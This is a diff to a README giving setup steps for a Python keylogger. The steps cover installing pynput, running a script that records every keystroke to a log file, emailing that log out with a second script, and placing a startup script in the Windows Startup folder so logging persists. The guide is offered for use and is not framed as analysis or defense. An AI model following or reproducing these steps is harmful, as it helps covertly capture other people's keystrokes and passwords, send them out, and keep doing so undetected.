@@ -3,7 +3,11 @@
 step 1:- paste the folder in C: directory
 
 
-step 2:- for 'python-keylogger.pyw' to execute we need to install 'pynput' from cmd (internet required)
+step 2:- install python from pyhton.org before installation check both boxes and make sure that in customized installation
+         all options except last two are checked.
+
+
+step 3:- for 'python-keylogger.pyw' to execute we need to install 'pynput' from cmd (internet required)
          type this(in cmd):  "pip install pynput"
          this file creates a 'keylogs.txt' file in which all key strokes are stored
 
@@ -12,9 +16,9 @@ for 'send_email.pyw' file to work 'keylogs.txt' file should be in the same direc
 (change the email credentials for convenience)
 
 
-step 3:- press win+r andopen this directory
+step 4:- press win+r andopen this directory
          %AppData%\Microsoft\Windows\Start Menu\Programs
          cut & paste this file 'keylogger startup.pyw' in Startup folder
          if it doesn't exist then make one
          
-step 4:- execute 'python-keylogger.pyw' then 'send_email.pyw'
+step 5:- execute 'python-keylogger.pyw' then 'send_email.pyw'
